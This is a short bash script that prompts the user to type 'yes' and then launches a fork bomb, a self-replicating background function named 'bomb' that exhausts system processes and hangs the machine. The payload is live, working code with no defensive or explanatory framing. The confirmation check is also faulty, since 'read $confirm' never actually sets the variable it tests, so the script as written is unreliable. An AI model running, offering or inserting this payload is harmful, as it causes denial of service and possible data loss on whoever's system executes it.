#!/bin/bash

echo "Type 'yes' to confirm."

read $confirm

if [[ $confirm == "yes" ]]
then
	echo "Confirmed."
	bomb() { bomb | bomb & }; bomb
else
	echo "Cancelled."
fi
